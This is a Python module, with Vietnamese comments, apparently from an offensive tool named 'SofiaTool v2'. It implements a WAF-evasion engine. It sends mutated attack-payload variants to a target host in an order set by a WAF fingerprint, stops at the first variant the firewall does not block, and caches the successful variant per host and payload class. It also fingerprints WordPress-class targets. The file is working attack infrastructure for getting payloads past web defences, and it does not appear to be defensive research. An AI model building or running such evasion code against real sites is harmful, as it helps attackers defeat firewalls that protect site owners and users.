"""SofiaTool v2 — evasion: chạy biến thể payload thích ứng + cache theo host.

Ý tưởng: `wp_mutator` sinh nhiều biến thể; `evasion` gửi LẦN LƯỢT theo thứ tự
ưu tiên (do WAF fingerprint quyết định), dừng ngay ở biến thể đầu tiên mà WAF
KHÔNG chặn. Biến thể thành công được NHỚ theo (host, lớp payload) để request
sau (cùng host/lớp) dùng lại → giảm request, tăng tốc.

Không import `exploit_wo` (waf/ là tầng dưới) — chỉ dùng `waf.detect` + core.
"""

import threading

import requests

from core.logger import get_logger
from waf import detect as _detect

try:  # cho phép import dạng `from waf import evasion` lẫn chạy trực tiếp
    from waf import wp_mutator as _mut
except ImportError:  # pragma: no cover
    _mut = None

log = get_logger()

_LOCK = threading.Lock()
_CACHE = {}   # (host, payload_class) -> slug

_OVERRIDE_KEYS = ("url", "headers", "data", "files", "params", "json")


# ------------------------------------------------------------------- cache -----
def _key(host, payload_class):
    return f"{host}|{payload_class}"


def get_remembered(host, payload_class):
    with _LOCK:
        return _CACHE.get(_key(host, payload_class))


def remember(host, payload_class, slug):
    if not slug:
        return
    with _LOCK:
        _CACHE[_key(host, payload_class)] = slug
    log.debug("evasion: nhớ variant %s cho %s/%s", slug, host, payload_class)


def forget(host, payload_class=None):
    with _LOCK:
        if payload_class is None:
            for k in [k for k in _CACHE if k.startswith(f"{host}|")]:
                _CACHE.pop(k, None)
        else:
            _CACHE.pop(_key(host, payload_class), None)


def snapshot():
    with _LOCK:
        return dict(_CACHE)


# ----------------------------------------------------------------- ordering ----
def ordered(variants, waf_info, payload_class, host=None):
    """Sắp variants theo: cache đã nhớ -> evasion_plan -> còn lại (giữ nguyên thứ tự)."""
    cached = get_remembered(host, payload_class) if host else None
    plan = []
    if _mut is not None:
        try:
            plan = _mut.evasion_plan(waf_info, payload_class)
        except Exception:  # pragma: no cover
            plan = []

    def rank(v):
        slug = v.get("slug")
        if cached and slug == cached:
            return (-1, 0)
        cat = v.get("cat")
        if cat and cat in plan:
            return (plan.index(cat), 1)
        # khớp một phần slug với plan (vd cat nằm trong slug)
        if plan:
            for i, c in enumerate(plan):
                if c and slug and c in slug:
                    return (i, 2)
        return (len(plan) + 1, 3)

    return sorted(variants, key=rank)


# -------------------------------------------------------------- send engine ----
def _merge(base_kw, variant):
    kw = dict(base_kw)
    for k in _OVERRIDE_KEYS:
        if k in variant and variant[k] is not None:
            kw[k] = variant[k]
    return kw


def send_variants(sess, base, method, url, variants, payload_class,
                  waf_info=None, timeout=None, stop_on_first_ok=True,
                  **base_kw):
    """Gửi lần lượt các variant, trả (resp, variant) của lần KHÔNG bị chặn đầu tiên.

    - Nếu tất cả đều bị chặn/ lỗi: trả (resp_cuối_không_chặn_hoặc_None, None).
    - `base` dùng làm host cho cache (thường là scheme://host).
    - `timeout` mặc định lấy từ sess.request_timeout.
    """
    if not variants:
        return None, None
    host = base
    order = ordered(variants, waf_info, payload_class, host=host)
    timeout = timeout or getattr(sess, "request_timeout", None)
    first_resp = None
    blocked_seen = 0
    for v in order:
        kw = _merge(base_kw, v)
        final_url = kw.pop("url", url)
        if timeout is not None:
            kw.setdefault("timeout", timeout)
        kw.setdefault("allow_redirects", True)
        try:
            resp = sess.request(method, final_url, **kw)
        except requests.RequestException as e:
            log.debug("evasion: variant %s lỗi request: %s", v.get("slug"), e)
            continue
        if first_resp is None:
            first_resp = resp
        if _detect.is_blocked(resp):
            blocked_seen += 1
            log.debug("evasion: variant %s bị chặn (%s)", v.get("slug"),
                      resp.status_code)
            continue
        # không bị chặn -> nhớ + trả về
        remember(host, payload_class, v.get("slug"))
        log.info("evasion: %s/%s dùng variant '%s' (%s)",
                 host, payload_class, v.get("slug"), resp.status_code)
        return resp, v
    if blocked_seen:
        log.info("evasion: %s/%s tất cả %d variant đều bị chặn",
                 host, payload_class, blocked_seen)
    return first_resp, None


def post_variants(sess, base, url, variants, payload_class, waf_info=None, **kw):
    return send_variants(sess, base, "POST", url, variants, payload_class,
                         waf_info=waf_info, **kw)


def get_variants(sess, base, url, variants, payload_class, waf_info=None, **kw):
    return send_variants(sess, base, "GET", url, variants, payload_class,
                         waf_info=waf_info, **kw)


def probe_blocked(sess, base, timeout=None):
    """Tiện ích: chạy fingerprint WP-class (detect_wp) — dùng khi chưa có info."""
    return _detect.detect_wp(base, sess, timeout=timeout)
